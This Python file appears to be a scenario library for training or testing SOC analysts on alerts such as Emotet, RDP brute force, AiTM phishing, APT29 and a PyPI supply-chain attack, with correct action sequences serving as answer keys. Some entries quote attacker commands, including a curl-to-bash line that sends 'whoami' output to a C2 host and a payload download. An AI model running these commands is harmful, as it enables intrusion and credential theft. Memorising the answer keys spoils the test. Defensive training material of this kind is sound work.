# Copyright (c) Meta Platforms, Inc. and affiliates.
# All rights reserved.
#
# This source code is licensed under the BSD-style license found in the
# LICENSE file in the root directory of this source tree.

"""
SOC Scenario Library — Real-World Threat Intelligence Scenarios.

Each scenario includes:
  - initial_signals       : What the analyst sees first (may include noise)
  - investigation_context : Revealed by investigate/query_logs
  - threat_intel_context  : Revealed by check_threat_intel
  - sandbox_context       : Revealed by run_sandbox
  - deep_investigation_context: Revealed by second investigate
"""

from typing import Any, Dict, List

SCENARIOS: List[Dict[str, Any]] = [

    # ─────────────── EASY ───────────────

    {
        "id": "easy_impossible_travel",
        "alert_type": "impossible_travel_login",
        "severity": "high",
        "difficulty": "easy",
        "initial_signals": [
            "Login from Seoul, South Korea at 06:12 UTC",
            "Login from Lagos, Nigeria at 06:51 UTC (same account)",
            "Account: finance analyst — payroll access",
            "Physical distance: ~11,700 km in 39 minutes (physically impossible)",
            "Both logins succeeded — no MFA challenge triggered",
            "[NOISE] Routine password expiry warning sent to same user at 06:00 UTC",
        ],
        "investigation_context": {
            "account_privileges": "Payroll system write access, wire transfer approval up to $50K",
            "previous_travel": "No international travel in 180 days — home city is London",
            "mfa_status": "Enrolled but SMS OTP — known SIM-swap attack vector",
            "recent_activity": "2 pending wire transfers totaling $87,000 submitted at 06:32 UTC",
            "device_fingerprint": "Lagos login used unknown device — Seoul login used known MacBook",
        },
        "threat_intel_context": {
            "nigeria_ip": "45.141.84.220 — listed on 6 threat feeds, BEC infrastructure",
            "campaign": "Active West African BEC campaign targeting finance teams this week",
            "mitre_technique": "T1078.004 — Valid Accounts: Cloud Accounts",
            "recommended_action": "Block account immediately — wire transfers pending review",
        },
        "deep_investigation_context": {
            "email_analysis": "Phishing email received 3 days ago — user clicked link, credentials likely stolen",
            "sms_intercept_evidence": "SMS OTP delivered to unknown number — SIM swap confirmed",
            "wire_transfer_status": "PENDING — finance manager notified, transfers on hold for 2h",
        },
        "correct_sequence": ["investigate", "block_account", "request_mfa"],
        "optimal_terminal": "block_account",
        "false_positive": False,
        "description": (
            "Impossible travel: finance account logged in 11,700 km apart in 39 minutes. "
            "Active BEC campaign. Wire transfers pending. SIM-swap MFA bypass confirmed."
        ),
    },

    {
        "id": "easy_false_positive_vpn",
        "alert_type": "anomalous_login_location",
        "severity": "low",
        "difficulty": "easy",
        "initial_signals": [
            "Login from Zurich, Switzerland (first time for this user)",
            "Account: junior marketing analyst",
            "Login succeeded — Authenticator app MFA passed",
            "Device: managed MacBook (MDM enrolled, fully compliant)",
            "Time: 09:15 local time (business hours)",
            "[NOISE] Same user had failed login attempt last week from own city (typo)",
        ],
        "investigation_context": {
            "vpn_provider": "Corporate Zscaler ZPA exit node — Zurich PoP confirmed",
            "travel_approval": "Approved travel request — Basel tech conference, 3-day trip",
            "device_status": "Fully patched, encrypted, EDR installed, MDM compliant",
            "user_risk_score": "Low — no sensitive data access, no admin rights",
            "previous_alerts": "2 similar geo-alerts in past year — both confirmed false positives",
        },
        "threat_intel_context": {
            "zurich_ip": "185.128.24.10 — Zscaler ZPA exit node, clean reputation",
            "verdict": "No threat intel match — legitimate corporate VPN infrastructure",
        },
        "correct_sequence": ["investigate", "ignore"],
        "optimal_terminal": "ignore",
        "false_positive": True,
        "description": (
            "Junior marketing analyst using corporate ZPA VPN from approved conference travel. "
            "Strong MFA, managed compliant device, low-risk account. Classic geo-alert false positive."
        ),
    },

    {
        "id": "easy_emotet_dropper",
        "alert_type": "malware_detection",
        "severity": "critical",
        "difficulty": "easy",
        "initial_signals": [
            "CrowdStrike: Emotet dropper detected — prevention BLOCKED execution",
            "File: invoice_overdue_ref8821.xlsm (macro-enabled Excel attachment)",
            "Delivered via email — sender: invoices@supplier-billing[.]net (spoofed)",
            "Endpoint: Windows 11 workstation, user has local admin rights",
            "Process attempted: Excel.exe -> cmd.exe -> powershell.exe -enc [base64]",
            "[NOISE] Same user received 3 other marketing emails with attachments today",
        ],
        "investigation_context": {
            "file_hash": "SHA256: a3f1c2d4e5 — 71/72 AV engines flag as Emotet loader",
            "c2_attempt": "Blocked outbound to 91.240.118.168:8080 — known Emotet C2 (Abuse.ch)",
            "execution_blocked": "True — EDR prevented payload execution before C2 established",
            "email_campaign": "Same lure sent to 34 users in 2 hours — 3 others may have clicked",
            "cve": "CVE-2022-30190 (Follina) exploitation attempted via macro",
        },
        "sandbox_context": {
            "detonation_result": "Emotet loader confirmed — downloads secondary Cobalt Strike payload",
            "c2_domains": ["91.240.118.168", "185.220.101.47", "45.141.84.99"],
            "persistence": "Scheduled task created: 'WindowsUpdateService'",
            "lateral_movement_capability": "Credential harvesting module detected in payload",
            "verdict": "MALICIOUS — isolate immediately, check 3 users who also clicked",
        },
        "correct_sequence": ["isolate_device", "collect_forensics", "escalate"],
        "optimal_terminal": "isolate_device",
        "false_positive": False,
        "description": (
            "Emotet dropper blocked on endpoint. CVE-2022-30190 exploitation attempted. "
            "3 other users at risk. Cobalt Strike secondary payload confirmed in sandbox."
        ),
    },

    # ─────────────── MEDIUM ───────────────

    {
        "id": "medium_rdp_brute_force",
        "alert_type": "brute_force_rdp",
        "severity": "high",
        "difficulty": "medium",
        "initial_signals": [
            "2,847 failed RDP login attempts in 6 minutes from 45.141.84.120",
            "Target: internet-facing jump server (RDP exposed on port 3389)",
            "12 successful logins detected — username: svc_deploy",
            "Login time: 03:22 UTC Saturday (off-hours, no change window active)",
            "Geo: Source IP resolves to Bucharest, Romania",
            "[NOISE] Routine backup job also ran on jump server at 03:00 UTC",
        ],
        "investigation_context": {
            "svc_deploy_account": "Service account — last legitimate use 5 months ago",
            "post_login_commands": [
                "whoami /all",
                "net group 'Domain Admins' /domain",
                "nltest /domain_trusts",
                "Invoke-WebRequest hxxp://transfer.sh/payload.exe -OutFile C:\\Windows\\Temp\\svc.exe",
            ],
            "payload_dropped": "svc.exe present in C:\\Windows\\Temp\\ — not yet executed",
            "active_session": "RDP session still active — attacker may be interactive",
        },
        "threat_intel_context": {
            "source_ip": "45.141.84.120 — Scattered Spider (UNC3944) known infrastructure",
            "threat_actor": "Scattered Spider — specializes in RDP brute force then ransomware deployment",
            "campaign": "Active campaign targeting jump servers this month — 4 organizations hit",
            "mitre_techniques": [
                "T1110.001 — Brute Force: Password Guessing",
                "T1021.001 — Remote Services: RDP",
                "T1105 — Ingress Tool Transfer",
            ],
            "recommended": "Block IP and isolate jump server — ransomware deployment typically follows within 2h",
        },
        "correct_sequence": ["investigate", "block_ip", "block_account", "isolate_device"],
        "optimal_terminal": "block_ip",
        "false_positive": False,
        "description": (
            "Scattered Spider RDP brute force succeeded on dormant service account. "
            "Cobalt Strike stager downloaded but not executed. Active session ongoing. "
            "Block source IP and isolate before ransomware deployment."
        ),
    },

    {
        "id": "medium_insider_threat",
        "alert_type": "data_exfiltration_attempt",
        "severity": "high",
        "difficulty": "medium",
        "initial_signals": [
            "DLP: 8.3 GB uploaded to personal Dropbox in 47 minutes",
            "Account: senior software engineer — R&D team",
            "Files: source code, architecture diagrams, API keys (DLP classifier hit)",
            "Upload time: 22:14 local time — after business hours",
            "VPN connected — corporate laptop used",
            "[NOISE] Colleague on same team also did large download from code repo today (authorized)",
        ],
        "investigation_context": {
            "employee_status": "Resignation letter submitted yesterday — last day in 2 weeks",
            "files_confirmed": [
                "proprietary_algorithm_v4.py — core product IP",
                "prod_api_keys.env — live AWS + Stripe production keys",
                "customer_db_export_2024.csv — 47,000 customer records (PII)",
                "architecture_roadmap_2025.pdf — confidential strategic document",
            ],
            "prior_anomalies": "3 large code repo downloads in past week — flagged but not reviewed",
            "legal_exposure": "GDPR + SOC2 violation if customer PII confirmed exfiltrated",
            "legal_hold_required": True,
        },
        "deep_investigation_context": {
            "linkedin_update": "New role announced at direct competitor — starting next month",
            "dropbox_account": "Personal account — files already synced to competitor laptop (unverified)",
            "git_history": "Deleted local git history on corporate laptop 2 days ago — suspicious",
            "recommendation": "Block account, preserve forensics for legal — do NOT tip off employee",
        },
        "correct_sequence": ["investigate", "block_account", "collect_forensics", "escalate"],
        "optimal_terminal": "escalate",
        "false_positive": False,
        "description": (
            "Departing R&D engineer exfiltrating source code, live API keys, and 47K customer "
            "records to personal Dropbox. Legal hold required. GDPR/SOC2 exposure confirmed."
        ),
    },

    {
        "id": "medium_aitm_phishing",
        "alert_type": "phishing_link_clicked",
        "severity": "high",
        "difficulty": "medium",
        "initial_signals": [
            "User clicked link: 'Urgent: Your M365 account will be suspended'",
            "URL: https://login.microsoftonline-secure-verify[.]com (typosquat)",
            "User: executive assistant to CFO — has calendar and email delegation",
            "Email passed SPF/DKIM — sent from compromised partner domain",
            "Browser redirected through Cloudflare Worker — AiTM proxy pattern detected",
            "[NOISE] CFO also received same email but did not click",
        ],
        "investigation_context": {
            "url_verdict": "EvilProxy AiTM phishing kit — harvests session tokens in real-time",
            "session_status": "New sign-in from 185.220.101.34 (Tor exit node) 4 minutes ago",
            "mfa_bypassed": "SMS OTP is susceptible to AiTM — token already issued to attacker",
            "ea_access": "Full mailbox delegation for CFO, can send emails as CFO",
            "payment_risk": "CFO has 3 pending wire approvals in inbox totaling $340,000",
        },
        "threat_intel_context": {
            "threat_actor": "Storm-1167 — Microsoft-tracked BEC group, 200+ victims in 2024",
            "infrastructure": "185.220.101.34 — Tor exit node used exclusively for BEC campaigns",
            "mitre_techniques": [
                "T1557 — Adversary-in-the-Middle",
                "T1528 — Steal Application Access Token",
            ],
            "urgency": "Attacker has live session — acting within minutes of token theft",
        },
        "correct_sequence": ["investigate", "request_mfa", "monitor"],
        "optimal_terminal": "request_mfa",
        "false_positive": False,
        "description": (
            "EvilProxy AiTM attack — CFO EA session token stolen. Attacker has live Tor session. "
            "MFA already bypassed. $340K in pending wire approvals at risk."
        ),
    },

    # ─────────────── HARD ───────────────

    {
        "id": "hard_apt_lateral_movement",
        "alert_type": "lateral_movement_detected",
        "severity": "critical",
        "difficulty": "hard",
        "initial_signals": [
            "CrowdStrike: Pass-the-Hash — WS-04 authenticating as DA-svc (domain admin service account)",
            "SIEM: SMB lateral movement chain: WS-01 -> WS-04 -> FS-01 -> DC-01 (in progress)",
            "EDR: LSASS dumped via reflective DLL injection on WS-01 at 03:17 UTC",
            "Firewall: Beacon to 185.220.101.99:443 every 28 seconds — malleable C2 profile",
            "AV: Zero detections — fully fileless attack using LOLBins only",
            "[NOISE] Scheduled backup job also ran at 03:00 UTC — ignore SMB traffic to BACKUP-01",
        ],
        "investigation_context": {
            "initial_access": "Spear-phishing ISO exploiting CVE-2023-36884 — WS-01 user, 56 hours ago",
            "accounts_compromised": [
                "WS-01 local admin — original foothold",
                "svc_backup — domain service account, backup operator rights",
                "DA-svc — domain admin hash captured via LSASS, cracking in progress",
            ],
            "persistence": [
                "WMI subscription: 'SystemMonitor' on WS-01 and WS-04",
                "Registry run key tampered — WinDefend service modified",
            ],
            "dc_status": "DC-01 not yet reached — 2 failed auth attempts, retrying every 5 min",
            "exfil_status": "Not detected yet — likely staging phase before exfil",
        },
        "threat_intel_context": {
            "threat_actor": "APT29 (Cozy Bear / Midnight Blizzard) — 91% TTP confidence",
            "c2_server": "185.220.101.99 — Mandiant-tracked APT29 C2, active since Monday",
            "campaign": "Targeting government contractors and defense suppliers — 3 victims this month",
            "cve": "CVE-2023-36884 — Office HTML RCE, patched Aug 2023, still unpatched on WS-01",
            "mitre_techniques": [
                "T1550.002 — Pass the Hash",
                "T1003.001 — LSASS Memory Dump",
                "T1071.001 — Web Protocols C2",
                "T1547.001 — Registry Run Keys Persistence",
            ],
        },
        "sandbox_context": {
            "cobalt_strike_config": "Malleable C2 profile mimicking Office 365 traffic on port 443",
            "beacon_interval": "28 seconds with 10% jitter — typical APT29 OPSEC",
            "capability": "Full post-exploitation: keylogging, screenshot, lateral movement, credential harvest",
            "verdict": "Nation-state grade tooling — escalate to IR team immediately after containment",
        },
        "correct_sequence": [
            "investigate",
            "isolate_device",
            "block_ip",
            "collect_forensics",
            "escalate",
        ],
        "optimal_terminal": "escalate",
        "false_positive": False,
        "description": (
            "Active APT29 intrusion — Cobalt Strike C2 live, Pass-the-Hash lateral movement "
            "toward Domain Controller. CVE-2023-36884 initial access 56h ago. "
            "DA hash being cracked. DC-01 not yet compromised — window is closing."
        ),
    },

    {
        "id": "hard_supply_chain_pypi",
        "alert_type": "suspicious_package_behavior",
        "severity": "critical",
        "difficulty": "hard",
        "initial_signals": [
            "SIEM: Python package 'requests-enhanced' spawning shell on 8 dev machines",
            "DNS: Dev machines querying c2.pypi-cdn[.]io every 60s (newly registered domain)",
            "Package installed yesterday via pip from internal PyPI mirror",
            "Package name typosquats 'requests' — 200M weekly downloads, easy to miss",
            "No CVE — maintainer account hijacked via credential stuffing attack",
            "[NOISE] Legitimate 'requests' package v2.31.0 also installed on all machines",
        ],
        "investigation_context": {
            "package_payload": "setup.py executes: curl -s https://c2.pypi-cdn[.]io/$(whoami|base64) | bash",
            "affected_machines": "8 developer workstations — all have AWS prod credentials in ~/.aws/",
            "aws_exposure": [
                "IAM keys with S3 full access — prod data lake with 2TB customer data",
                "Secrets Manager read access — DB passwords and third-party API keys",
                "EC2 describe permissions — full infrastructure enumeration possible",
            ],
            "cloudtrail": "3 GetSecretValue API calls in last 90 min from unusual IP — staged exfil?",
            "github": "No suspicious commits yet — codebase may be mapped but not modified",
        },
        "threat_intel_context": {
            "domain": "c2.pypi-cdn[.]io — registered 6 days ago, Namecheap privacy shield",
            "threat_actor": "Lazarus Group (DPRK state-sponsored) — financial motivation",
            "campaign": "PyPI supply chain attacks targeting crypto/fintech devs — 12 packages found",
            "mitre_techniques": [
                "T1195.001 — Supply Chain Compromise: Software Dependencies",
                "T1552.001 — Credentials In Files",
                "T1078.004 — Valid Accounts: Cloud Accounts",
            ],
            "urgency": "AWS credential exfil may be in progress — rotate secrets immediately",
        },
        "sandbox_context": {
            "payload_analysis": "Stage 1: exfiltrates environment variables and ~/.aws/credentials",
            "stage2": "Downloads Lazarus custom RAT — persistent backdoor with keylogging",
            "c2_protocol": "HTTPS with certificate pinning — evades SSL inspection",
            "verdict": "Nation-state supply chain attack — patch_system (remove package) then escalate",
        },
        "correct_sequence": [
            "investigate",
            "patch_system",
            "collect_forensics",
            "monitor",
            "escalate",
        ],
        "optimal_terminal": "patch_system",
        "false_positive": False,
        "description": (
            "Lazarus Group supply chain attack via hijacked PyPI package. "
            "AWS prod creds on 8 dev machines. CloudTrail shows early exfil. "
            "Remove package, rotate secrets, preserve forensics."
        ),
    },

    {
        "id": "hard_authorized_pentest",
        "alert_type": "port_scan_detected",
        "severity": "medium",
        "difficulty": "hard",
        "initial_signals": [
            "IDS: Aggressive Nmap scan — 65,535 ports probed in 90 seconds",
            "Source: 10.10.50.15 scanning entire 10.0.0.0/8 internal network",
            "Scan type: SYN stealth scan with OS fingerprinting and version detection",
            "Ports targeted: 22, 23, 80, 443, 445, 1433, 3306, 3389, 5432, 8080",
            "No firewall blocks — internal network policy allows this segment",
            "[NOISE] IDS also flagged unrelated port scan from 10.0.5.99 — that one IS suspicious",
        ],
        "investigation_context": {
            "source_host": "PENTEST-VM-01 — dedicated penetration testing virtual machine",
            "authorization": "Signed SOW on file — annual penetration test engagement",
            "change_ticket": "CHG-9921 — approved and signed by CISO",
            "scope": "Full internal network — RoE document authorizes all hosts in 10.0.0.0/8",
            "schedule": "Pentest window: Mon–Fri 08:00–18:00 UTC — current time 10:34 UTC Tuesday",
            "ids_note": "IDS whitelist not updated after rule change last week — caused this false alert",
        },
        "threat_intel_context": {
            "source_ip": "10.10.50.15 — internal PENTEST-VM-01, known and registered asset",
            "verdict": "Authorized activity — no threat intel applicable to internal pentest VM",
            "action": "Update IDS whitelist for pentest VLAN, close alert as false positive",
        },
        "correct_sequence": ["investigate", "ignore"],
        "optimal_terminal": "ignore",
        "false_positive": True,
        "description": (
            "Authorized annual penetration test triggering IDS after whitelist not updated. "
            "Signed SOW, RoE, CISO approval, within scheduled window. "
            "Note: separate suspicious scan from 10.0.5.99 should be investigated separately."
        ),
    },
]

# Quick lookup by difficulty
EASY_SCENARIOS   = [s for s in SCENARIOS if s["difficulty"] == "easy"]
MEDIUM_SCENARIOS = [s for s in SCENARIOS if s["difficulty"] == "medium"]
HARD_SCENARIOS   = [s for s in SCENARIOS if s["difficulty"] == "hard"]